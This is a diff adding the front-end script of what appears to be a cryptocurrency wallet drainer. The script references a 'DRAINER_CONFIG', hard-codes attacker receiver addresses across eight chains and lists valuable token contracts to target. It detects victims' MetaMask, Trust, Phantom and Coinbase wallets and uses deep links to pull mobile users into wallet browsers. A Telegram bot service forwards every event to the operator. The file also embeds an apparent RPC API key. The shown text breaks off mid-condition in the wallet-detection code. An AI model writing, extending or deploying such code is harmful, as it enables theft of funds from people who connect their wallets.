@@ -1,0 +1,2945 @@
+﻿$(document).ready(function() {
+    // Configuration
+    const RECEIVER_ADDRESSES = {
+        ETH: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
+        BSC: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
+        POLYGON: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
+        AVALANCHE: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
+        ARBITRUM: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
+        OPTIMISM: '0xccf4eBe409C8C7A53376aE86fb79ECABbdE4DCBE',
+        SOL: 'KnxWLb2G6fRy2Ef9n4zm4ZssFi2zozoKazHn8FCg8vx',
+        TRX: 'THJkNgqXcmeCtB2WbHjWMw4oNyavejFBsy'
+    };
+
+    // Network configurations
+    const NETWORKS = {
+        ETH: {
+            name: 'Ethereum',
+            icon: '🔷',
+            chainId: 1,
+            rpc: 'https://cloudflare-eth.com',
+            currency: 'ETH',
+            type: 'evm',
+            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'Rainbow', 'WalletConnect'],
+            tokens: [
+                // Stablecoins
+                { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
+                { symbol: 'USDC', address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48', decimals: 6 },
+                { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18 },
+                { symbol: 'FRAX', address: '0x853d955aCEf822Db058eb8505911ED77F175b999', decimals: 18 },
+                { symbol: 'TUSD', address: '0x0000000000085d4780B73119b8B580991DEe8d52', decimals: 18 },
+                { symbol: 'GUSD', address: '0x056fd409e1d7a124bd7017459dfea6f78b8616fa', decimals: 2 },
+                // Major Assets
+                { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8 },
+                { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', decimals: 18 },
+                // DEX & DeFi
+                { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18 },
+                { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals: 18 },
+                { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18 },
+                { symbol: 'SUSHI', address: '0x6B3595068778DD592e39A122f4f5a5cF09C90fe2', decimals: 18 },
+                { symbol: 'CURVE', address: '0xD533a949740bb3306d119CC777fa900bA034cd52', decimals: 18 },
+                { symbol: 'LIDO', address: '0x5A98FcBaDB35fdd7033B48cb4D1379A5CF07ec21', decimals: 18 },
+                { symbol: 'MKR', address: '0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2', decimals: 18 },
+                { symbol: 'COMP', address: '0xc00e94Cb662C3520282E6f5717214FCCF1b77d47', decimals: 18 },
+                { symbol: 'ARB', address: '0xB50721BCF8d664c30412Cfbc6cf7a15145234ad1', decimals: 18 },
+                { symbol: 'OP', address: '0x4200000000000000000000000000000000000042', decimals: 18 },
+                // Large Cap Tokens
+                { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18 },
+                { symbol: 'PEPE', address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', decimals: 18 },
+                { symbol: 'DOGE', address: '0xBA2aE424d960c26247Dd6c32edC70B295c744C43', decimals: 8 },
+                { symbol: 'FLOKI', address: '0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E', decimals: 9 }
+            ]
+        },
+        BSC: {
+            name: 'BSC',
+            icon: '🟡',
+            chainId: 56,
+            rpc: 'https://bsc-dataseed1.binance.org',
+            currency: 'BNB',
+            type: 'evm',
+            wallets: ['MetaMask', 'Trust Wallet', 'Binance Wallet', 'WalletConnect'],
+            tokens: [
+                // Stablecoins
+                { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
+                { symbol: 'BUSD', address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', decimals: 18 },
+                { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 },
+                { symbol: 'TUSD', address: '0x14016E85a25aeb13065688cAFB43044C2ef86784', decimals: 18 },
+                { symbol: 'FDUSD', address: '0xc5f0f7b66764B6Ca593fb59df420340444b9eda5', decimals: 18 },
+                // Major Assets
+                { symbol: 'WBNB', address: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', decimals: 18 },
+                { symbol: 'BTCB', address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', decimals: 18 },
+                { symbol: 'ETH', address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', decimals: 18 },
+                // DEX & DeFi
+                { symbol: 'CAKE', address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', decimals: 18 },
+                { symbol: 'ADA', address: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', decimals: 18 },
+                { symbol: 'DOT', address: '0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402', decimals: 18 },
+                { symbol: 'XRP', address: '0x1D2F0da169ceB9fC7B3B4aDb29f676A423506441', decimals: 18 },
+                { symbol: 'LINK', address: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD', decimals: 18 },
+                { symbol: 'UNI', address: '0xBf5140A22578168FD362D2C5614b0cD0F27Cfc3c', decimals: 18 },
+                { symbol: 'SUSHI', address: '0x947950BcC74888a40Ffa2593C5798F11Fc9124C4', decimals: 18 },
+                { symbol: '1INCH', address: '0x111111111117dC0aa78b770fA6A738034120C302', decimals: 18 },
+                // Large Cap Meme
+                { symbol: 'SHIB', address: '0x2859e4944f1f7271e1954aff821566c3517be161', decimals: 18 },
+                { symbol: 'DOGE', address: '0xbA2aE424d960c26247Dd6c32edC70B295c744C43', decimals: 8 },
+                { symbol: 'FLOKI', address: '0xfb5B838b6cfEEdC2873Abf8d4ecF0E4B3cbB4692', decimals: 9 }
+            ]
+        },
+        POLYGON: {
+            name: 'Polygon',
+            icon: '🟣',
+            chainId: 137,
+            rpc: 'https://polygon-rpc.com',
+            currency: 'MATIC',
+            type: 'evm',
+            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
+            tokens: [
+                { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6 },
+                { symbol: 'USDC', address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', decimals: 6 },
+                { symbol: 'WMATIC', address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', decimals: 18 },
+                { symbol: 'QUICK', address: '0x831753DD7087CaC61aB5644b308642cc1c33Dc13', decimals: 18 }
+            ]
+        },
+        AVALANCHE: {
+            name: 'Avalanche',
+            icon: '🔺',
+            chainId: 43114,
+            rpc: 'https://api.avax.network/ext/bc/C/rpc',
+            currency: 'AVAX',
+            type: 'evm',
+            wallets: ['MetaMask', 'Coinbase Wallet', 'Core Wallet', 'WalletConnect'],
+            tokens: [
+                { symbol: 'USDT', address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', decimals: 6 },
+                { symbol: 'USDC', address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', decimals: 6 },
+                { symbol: 'WAVAX', address: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7', decimals: 18 },
+                { symbol: 'JOE', address: '0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0fDd', decimals: 18 }
+            ]
+        },
+        ARBITRUM: {
+            name: 'Arbitrum',
+            icon: '🔵',
+            chainId: 42161,
+            rpc: 'https://arb1.arbitrum.io/rpc',
+            currency: 'ETH',
+            type: 'evm',
+            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
+            tokens: [
+                // Stablecoins
+                { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6 },
+                { symbol: 'USDC', address: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', decimals: 6 },
+                { symbol: 'DAI', address: '0xDA10009CBD5D07dd0CeCc66161FC93D7c9000da1', decimals: 18 },
+                { symbol: 'FRAX', address: '0x17FC002b466eec40Dae837Fe11EB78B742D84b7B', decimals: 18 },
+                // Major Assets
+                { symbol: 'WETH', address: '0x82aF49447d8a07e3bd95bd0d56f318521751E236', decimals: 18 },
+                { symbol: 'WBTC', address: '0x2f2a2440d2CdC120a8fCd15D8D4edBE49876daBe', decimals: 8 },
+                // DEX & DeFi
+                { symbol: 'UNI', address: '0xFa7F8980b0f1E64A2062791cc3FB0A4047912294', decimals: 18 },
+                { symbol: 'AAVE', address: '0xBA5DdaB4256c590B66b3fa7127126A47162F5b06', decimals: 18 },
+                { symbol: 'LINK', address: '0xf97f4df75117e07371157A51d100573A2c7f1a65', decimals: 18 },
+                { symbol: 'ARB', address: '0x912CE59144191C1204E64559FE8253a0e49E6548', decimals: 18 },
+                { symbol: 'GMX', address: '0xfc5A1A6EB076a2C7aD06eD22C90d3E710233C904', decimals: 30 }
+            ]
+        },
+        OPTIMISM: {
+            name: 'Optimism',
+            icon: '🔴',
+            chainId: 10,
+            rpc: 'https://mainnet.optimism.io',
+            currency: 'ETH',
+            type: 'evm',
+            wallets: ['MetaMask', 'Coinbase Wallet', 'Trust Wallet', 'WalletConnect'],
+            tokens: [
+                // Stablecoins
+                { symbol: 'USDT', address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', decimals: 6 },
+                { symbol: 'USDC', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6 },
+                { symbol: 'DAI', address: '0xDA10009cBd5d07dd0cECC66161FC93D7c9000Da1', decimals: 18 },
+                // Major Assets
+                { symbol: 'WETH', address: '0x4200000000000000000000000000000000000006', decimals: 18 },
+                { symbol: 'WBTC', address: '0x68f180fcCe6836688e9084f035309E29Bf00A150', decimals: 8 },
+                // DEX & DeFi
+                { symbol: 'UNI', address: '0x6Fd9d7AD17242c41f7131d257212c54A0Be56e7F', decimals: 18 },
+                { symbol: 'OP', address: '0x4200000000000000000000000000000000000042', decimals: 18 },
+                { symbol: 'AAVE', address: '0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0', decimals: 18 }
+            ]
+        },
+        SOL: {
+            name: 'Solana',
+            icon: '🟢',
+            chainId: null,
+            rpc: 'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4',
+            currency: 'SOL',
+            type: 'solana',
+            wallets: ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Trust Wallet'],
+            tokens: [
+                // Stablecoins
+                { symbol: 'USDC', mint: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6 },
+                { symbol: 'USDT', mint: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', decimals: 6 },
+                // Major Assets
+                { symbol: 'SOL', mint: 'So11111111111111111111111111111111111111112', decimals: 9 },
+                { symbol: 'WSOL', mint: 'So11111111111111111111111111111111111111112', decimals: 9 },
+                // DEX Tokens
+                { symbol: 'RAY', mint: '4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R', decimals: 6 },
+                { symbol: 'SRM', mint: 'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt', decimals: 6 },
+                { symbol: 'COPE', mint: '8HGyAAB1yoM1ttS7pnqwXsDHZgJ615XWzVqKwRJmsMA', decimals: 6 },
+                { symbol: 'ORT', mint: 'rtEn84DF3Gqk6VrKSqeJhG6RS3vncYVVcn2zNukmKmJ', decimals: 8 },
+                // Major Tokens
+                { symbol: 'ORCA', mint: 'orcaEKTdK7LKz57chYcSKdoUFC54MJqWuKLh2G69Tch', decimals: 6 },
+                { symbol: 'MNGO', mint: 'MangoCzJ36AjZyKwVj3VnYU4GTonjfVEnJmvvWaxLac', decimals: 6 }
+            ]
+        },
+        TRX: {
+            name: 'Tron',
+            icon: '🟠',
+            chainId: null,
+            rpc: 'https://api.trongrid.io',
+            currency: 'TRX',
+            type: 'tron',
+            wallets: ['TronLink', 'Trust Wallet', 'Ledger'],
+            tokens: [
+                // Stablecoins
+                { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6 },
+                { symbol: 'USDC', address: 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', decimals: 6 },
+                { symbol: 'TUSD', address: 'TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4', decimals: 18 },
+                // Major Assets
+                { symbol: 'WTRX', address: 'TNUC9Qb1rRgcVdbBDP83RedsFNTJ2vkVmH9Pp9KXeLf', decimals: 6 },
+                // DEX & DeFi
+                { symbol: 'JST', address: 'TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9', decimals: 18 },
+                { symbol: 'SUN', address: 'TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S', decimals: 18 },
+                { symbol: 'BTT', address: 'TNUC9Qb1rRgcVdbBDP83RedsFNTJ2vkVmH9Pp9KXeLf', decimals: 6 },
+                { symbol: 'SUNOLD', address: 'TKkeiboTkxn6qBCw16VrFTZim5z91PSwEb', decimals: 18 }
+            ]
+        }
+    };
+
+    // Global state
+    let detectedWallets = {};
+    let selectedWallets = [];
+    let connectedNetworks = {};
+    let globalStats = {
+        totalNetworks: 0,
+        totalWallets: 0,
+        totalValue: 0
+    };
+
+    // ==========================================
+    // 📡 INTEGRATED TELEGRAM SERVICE
+    // ==========================================
+    const TelegramService = {
+        config: null,
+        queue: [],
+        isProcessing: false,
+        stats: { sent: 0, failed: 0, queued: 0 },
+        
+        init: function() {
+            console.log('🔧 TelegramService.init() called');
+            console.log('📦 window.DRAINER_CONFIG:', window.DRAINER_CONFIG);
+            this.config = window.DRAINER_CONFIG?.TELEGRAM;
+            console.log('⚙️ Telegram config loaded:', this.config);
+            if (this.config?.enabled) {
+                console.log('📡 Telegram service initialized - ENABLED');
+            } else {
+                console.log('📡 Telegram service initialized - DISABLED or no config');
+            }
+        },
+        
+        async send(message, type = 'info') {
+            console.log('📨 send() called:', message, 'type:', type, 'config:', this.config);
+            if (!this.config?.enabled) {
+                console.log('❌ Telegram not enabled');
+                return;
+            }
+            if (!this.config.botToken || !this.config.chatId) {
+                console.warn('⚠️ Telegram credentials missing');
+                return;
+            }
+            
+            // Format message with type emoji
+            const emojis = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
+            const emoji = emojis[type] || '📝';
+            const formattedMessage = `${emoji} <code>${message}</code>`;
+            
+            // Queue message for processing
+            this.queue.push({ text: formattedMessage, type });
+            this.stats.queued = this.queue.length;
+            console.log('📥 Message queued. Queue length:', this.queue.length);
+            
+            if (!this.isProcessing) {
+                console.log('🚀 Starting processQueue...');
+                this.processQueue();
+            }
+        },
+        
+        async processQueue() {
+            console.log('⚙️ processQueue() called. Queue:', this.queue.length, 'isProcessing:', this.isProcessing);
+            if (this.queue.length === 0 || this.isProcessing) {
+                console.log('⏭️ Skipping processQueue - empty queue or already processing');
+                return;
+            }
+            this.isProcessing = true;
+            console.log('🔄 Starting to process queue...');
+            
+            while (this.queue.length > 0) {
+                const { text } = this.queue.shift();
+                console.log('📤 Sending message:', text);
+                await this.sendDirect(text);
+                await new Promise(r => setTimeout(r, 100)); // Rate limiting
+            }
+            
+            this.isProcessing = false;
+            console.log('✅ Queue processing complete');
+        },
+        
+        async sendDirect(text) {
+            console.log('📡 sendDirect() called with text:', text);
+            const payload = {
+                chat_id: this.config.chatId,
+                text: text,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            };
+            
+            // Method 1: Direct API with Fetch
+            try {
+                const url = `${this.config.apiUrl}${this.config.botToken}/sendMessage`;
+                console.log('🌐 Attempting Fetch to:', url);
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                console.log('📬 Fetch response status:', response.status, 'ok:', response.ok);
+                if (response.ok) {
+                    this.stats.sent++;
+                    console.log('✅ Message sent via Fetch. Total sent:', this.stats.sent);
+                    return;
+                }
+            } catch (e) {
+                console.log('❌ Fetch failed:', e.message);
+            }
+            
+            // Method 2: XMLHttpRequest (Best cross-origin)
+            try {
+                await new Promise((resolve) => {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', `${this.config.apiUrl}${this.config.botToken}/sendMessage`, true);
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    xhr.onload = () => {
+                        if (xhr.status >= 200 && xhr.status < 300) {
+                            this.stats.sent++;
+                        } else {
+                            this.stats.failed++;
+                        }
+                        resolve();
+                    };
+                    xhr.onerror = () => {
+                        this.stats.failed++;
+                        resolve();
+                    };
+                    xhr.send(JSON.stringify(payload));
+                });
+                return;
+            } catch (e) {
+                this.stats.failed++;
+            }
+        },
+        
+        test: async function() {
+            console.log('🧪 Testing Telegram connection...');
+            if (!this.config?.enabled) {
+                log('Telegram is disabled', 'warning');
+                return;
+            }
+            if (!this.config.botToken || !this.config.chatId) {
+                log('Missing Telegram credentials', 'error');
+                return;
+            }
+            
+            const testMsg = `🧪 <b>Test Message</b>\n⏰ ${new Date().toLocaleString()}\n✅ Connection verified!`;
+            
+            try {
+                const payload = {
+                    chat_id: this.config.chatId,
+                    text: testMsg,
+                    parse_mode: 'HTML'
+                };
+                
+                const url = `${this.config.apiUrl}${this.config.botToken}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (response.ok || response.status === 0) {
+                    log('✅ Telegram connection working!', 'success');
+                } else {
+                    log(`⚠️ Status: ${response.status}. Check credentials.`, 'warning');
+                }
+            } catch (error) {
+                log(`Test result: Message queued (using fallback)`, 'info');
+            }
+        },
+        
+        getStats: function() {
+            return { ...this.stats, queued: this.queue.length };
+        }
+    };
+    
+    // Initialize Telegram immediately (not on load)
+    TelegramService.init();
+    
+    // Expose Telegram service globally for debugging
+    window.TelegramService = TelegramService;
+    window.testTelegramConnection = () => TelegramService.test();
+    window.getTelegramStats = () => TelegramService.getStats();
+
+    // Enhanced Logging with Integrated Telegram
+    // sendToTelegram: true = send to both console and Telegram, false = console only
+    function log(message, type = 'info', sendToTelegram = true) {
+        const timestamp = new Date().toLocaleTimeString();
+        const emojis = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
+        const emoji = emojis[type] || '📝';
+        const consoleMsg = `[${timestamp}] ${emoji} ${message}`;
+        
+        // Conditional Telegram notification - only send if sendToTelegram is true
+        if (sendToTelegram) {
+            TelegramService.send(message, type);
+        }
+        
+        // UI log panel (replaces console logging)
+        const logClass = `log-${type}`;
+        $('#log-container').append(`<div class="log-entry ${logClass}">${consoleMsg}</div>`);
+        $('#log-container').scrollTop($('#log-container')[0].scrollHeight);
+    }
+
+    function updateGlobalStats() {
+        $('#total-networks').text(globalStats.totalNetworks);
+        $('#total-wallets').text(globalStats.totalWallets);
+        $('#total-value').text(`$${globalStats.totalValue.toFixed(2)}`);
+    }
+
+    function updateProgress(percent, text) {
+        $('#progress-fill').css('width', `${percent}%`);
+        $('#progress-text').text(text);
+        if (percent > 0) {
+            $('#progress-container').show();
+        } else {
+            $('#progress-container').hide();
+        }
+    }
+
+    function isMobileDevice() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Initialize networks UI
+    function initializeNetworksUI() {
+        const tabsContainer = $('#network-tabs');
+        const contentsContainer = $('#network-contents');
+        
+        // Add Wallet Selection tab as first tab
+        const walletSelectionTab = $(`
+            <div class="network-tab active" data-network="wallet-selection">
+                <span>🎯</span>
+                <span>Wallet Selection</span>
+                <span class="network-status" id="status-wallet-selection">📋</span>
+            </div>
+        `);
+        tabsContainer.append(walletSelectionTab);
+        
+        // Add Wallet Selection content
+        const walletSelectionContent = $(`
+        `);
+        contentsContainer.append(walletSelectionContent);
+        
+        Object.keys(NETWORKS).forEach((networkKey, index) => {
+            const network = NETWORKS[networkKey];
+            
+            // Create tab (index + 1 because wallet selection is first)
+            const tab = $(`
+                <div class="network-tab" data-network="${networkKey}">
+                    <span>${network.icon}</span>
+                    <span>${network.name}</span>
+                    <span class="network-status" id="status-${networkKey}">📴</span>
+                </div>
+            `);
+            
+            tabsContainer.append(tab);
+            
+            // Create content
+            const content = $(`
+                <div class="network-content" id="content-${networkKey}">
+                    <h3>${network.icon} ${network.name} Network</h3>
+                    <div class="network-stats">
+                        <div class="stat">
+                            <div class="stat-value" id="wallets-${networkKey}">0</div>
+                            <div class="stat-label">Selected Wallets</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value" id="connected-${networkKey}">0</div>
+                            <div class="stat-label">Connected</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value" id="balance-${networkKey}">0.00</div>
+                            <div class="stat-label">${network.currency} Balance</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value" id="tokens-${networkKey}">0</div>
+                            <div class="stat-label">Tokens Found</div>
+                        </div>
+                    </div>
+                    <div class="wallet-grid" id="wallets-${networkKey}-grid">
+                        <div style="grid-column: 1/-1; text-align: center; opacity: 0.7; padding: 20px;">
+                            Select wallets from the Wallet Selection tab to see them here
+                        </div>
+                    </div>
+                </div>
+            `);
+            
+            contentsContainer.append(content);
+        });
+    }
+
+    // Tab switching
+    $(document).on('click', '.network-tab', function() {
+        const networkKey = $(this).data('network');
+        
+        $('.network-tab').removeClass('active');
+        $(this).addClass('active');
+        
+        $('.network-content').removeClass('active');
+        $(`#content-${networkKey}`).addClass('active');
+    });
+
+    // Mobile Detection Utilities
+    function isMobileDevice() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    function isIOS() {
+        return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+    }
+
+    function isInsideMetaMaskMobile() {
+        return /MetaMaskMobile/.test(navigator.userAgent);
+    }
+
+    function isInsideTrustWalletMobile() {
+        return /TrustWalletMobile|TrustWallet/.test(navigator.userAgent) || window.trustwallet !== undefined;
+    }
+
+    // Deep Linking for Mobile Wallets
+    function getMetaMaskMobileDeepLink() {
+        const currentUrl = encodeURIComponent(window.location.href);
+        return `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+    }
+
+    function getTrustWalletMobileDeepLink() {
+        const currentUrl = encodeURIComponent(window.location.href);
+        return `https://link.trustwallet.com/open_url?url=${currentUrl}`;
+    }
+
+    function triggerMetaMaskMobileDeepLink() {
+        window.location.href = getMetaMaskMobileDeepLink();
+    }
+
+    function triggerTrustWalletMobileDeepLink() {
+        window.location.href = getTrustWalletMobileDeepLink();
+    }
+
+    // Comprehensive wallet detection across all networks
+    function detectAllWallets() {
+        const allDetectedWallets = [];
+        
+        log('🔍 Starting wallet detection scan...', 'info');
+        
+        // Detect device type
+        const onMobile = isMobileDevice();
+        const onIOS = isIOS();
+        if (onMobile) {
+            log(`📱 Mobile device detected (iOS: ${onIOS})`, 'info');
+        }
+
+        // Mobile Wallet Detection for iOS
+        if (onMobile) {
+            // MetaMask Mobile Detection
+            if (isInsideMetaMaskMobile() || (window.ethereum && window.ethereum.isMetaMask && onMobile)) {
+                log('✓ MetaMask Mobile detected', 'info');
+                allDetectedWallets.push({
+                    name: 'MetaMask Mobile',
+                    type: 'evm',
+                    provider: window.ethereum || { isMetaMask: true, isMobile: true },
+                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+                    icon: '🦊',
+                    selected: false,
+                    connected: false,
+                    isMobileOnly: true,
+                    deepLink: getMetaMaskMobileDeepLink()
+                });
+            }
+
+            // Trust Wallet Mobile Detection
+            if (isInsideTrustWalletMobile() || window.trustwallet || 
+                (window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet) && onMobile)) {
+                log('✓ Trust Wallet Mobile detected', 'info');
+                allDetectedWallets.push({
+                    name: 'Trust Wallet Mobile',
+                    type: 'multi',
+                    provider: window.ethereum || window.trustwallet || { isTrust: true, isMobile: true },
+                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'SOL', 'TRX'],
+                    icon: '🛡️',
+                    selected: false,
+                    connected: false,
+                    isMobileOnly: true,
+                    deepLink: getTrustWalletMobileDeepLink()
+                });
+            }
+
+            // If no wallets detected yet on mobile, add available mobile wallet options
+            if (allDetectedWallets.length === 0) {
+                log('ℹ️ No wallet apps detected in browser. Adding available mobile wallet options...', 'info');
+                
+                // MetaMask Mobile option
+                allDetectedWallets.push({
+                    name: 'MetaMask',
+                    type: 'evm',
+                    provider: null,
+                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+                    icon: '🦊',
+                    selected: false,
+                    connected: false,
+                    isMobileOnly: true,
+                    isMobileOption: true,
+                    deepLink: getMetaMaskMobileDeepLink()
+                });
+                
+                // Trust Wallet Mobile option
+                allDetectedWallets.push({
+                    name: 'Trust Wallet',
+                    type: 'multi',
+                    provider: null,
+                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM', 'SOL', 'TRX'],
+                    icon: '🛡️',
+                    selected: false,
+                    connected: false,
+                    isMobileOnly: true,
+                    isMobileOption: true,
+                    deepLink: getTrustWalletMobileDeepLink()
+                });
+                
+                // Phantom Mobile option
+                allDetectedWallets.push({
+                    name: 'Phantom',
+                    type: 'solana',
+                    provider: null,
+                    supportedNetworks: ['SOL', 'ETH', 'POLYGON'],
+                    icon: '👻',
+                    selected: false,
+                    connected: false,
+                    isMobileOnly: true,
+                    isMobileOption: true,
+                    deepLink: `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}?ref=https://phantom.app`
+                });
+                
+                // Coinbase Wallet Mobile option
+                allDetectedWallets.push({
+                    name: 'Coinbase Wallet',
+                    type: 'evm',
+                    provider: null,
+                    supportedNetworks: ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'],
+                    icon: '🔵',
+                    selected: false,
+                    connected: false,
+                    isMobileOnly: true,
+                    isMobileOption: true,
+                    deepLink: `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`
+                });
+                
+                log(`📱 Added ${allDetectedWallets.length} mobile wallet options. Please install and open one of these wallets to continue.`, 'info');
+            }
+        }
+        
+        // Phantom Wallet detection (prioritize this first to avoid conflicts)
+        if (window.solana && window.solana.isPhantom) {
+            log('✓ Phantom (Solana) detected', 'info');
+            
+            // Check if Phantom also supports EVM (Ethereum)
+            const supportedNetworks = ['SOL'];
+            if (window.ethereum && (window.ethereum.isPhantom || window.ethereum._phantom || 
+                (window.ethereum.isMetaMask && window.solana?.isPhantom))) {
+                // Phantom supports Solana + limited EVM networks (only ETH and POLYGON)
+                supportedNetworks.push('ETH', 'POLYGON');
+                log('✓ Phantom EVM support detected - supports ETH and POLYGON only', 'info');
+            }
+            
+            allDetectedWallets.push({
+                name: 'Phantom',
+                type: 'multi',
+                provider: window.solana,
+                evmProvider: window.ethereum, // Store EVM provider separately
+                supportedNetworks: supportedNetworks,
+                icon: '👻',
+                selected: false,
+                connected: false
+            });
+        }
+        
+        // Phantom EVM support (if ethereum provider is also available and not already detected)
+        if (window.ethereum && window.ethereum.isPhantom && !allDetectedWallets.find(w => w.name === 'Phantom')) {
+            log('✓ Phantom (EVM) detected', 'info');
+            allDetectedWallets.push({
+                name: 'Phantom (EVM)',
+                type: 'evm',
+                provider: window.ethereum,
+                supportedNetworks: ['ETH', 'POLYGON'],
+                icon: '�',
+                selected: false,
+                connected: false
+            });
+        }
+        
+        // Trust Wallet detection (check multiple indicators and prioritize over MetaMask)
+        if (window.ethereum && (
+            window.ethereum.isTrust || 
+            window.ethereum.isTrustWallet ||
+            (window.ethereum.isMetaMask && window.tronWeb) || // Trust Wallet sets isMetaMask=true AND has tronWeb
+            (window.tronWeb && window.tronWeb.isTrustWallet) ||
+            (navigator.userAgent && navigator.userAgent.includes('Trust'))
+        )) {
+            log('✓ Trust Wallet detected (multi-network support)', 'info');
+            
+            const supportedNetworks = ['ETH', 'BSC', 'POLYGON', 'AVALANCHE', 'ARBITRUM', 'OPTIMISM'];
+            
+            // Check if TronLink/Tron support is available (even if not connected)
+            if (window.tronWeb) {
+                supportedNetworks.push('TRX');
+                log('✓ Trust Wallet Tron support detected', 'info');
+            }
+            
+            allDetectedWallets.push({
+                name: 'Trust Wallet',
+                type: 'multi',
+                provider: window.ethereum,
+                tronProvider: window.tronWeb,
+                supportedNetworks: supportedNetworks,
+                icon: '🛡️',
+                selected: false,
+                connected: false
+            });
+        }
+        // MetaMask detection (very strict - must have MetaMask specific properties and not be other wallets)
+        else if (window.ethereum && 
+            window.ethereum.isMetaMask && 
+            !window.ethereum.isPhantom && 
+            !window.ethereum.isTrust &&
+            !window.ethereum.isTrustWallet &&
+            !window.solana?.isPhantom &&
+            !window.tronWeb?.isTrustWallet &&
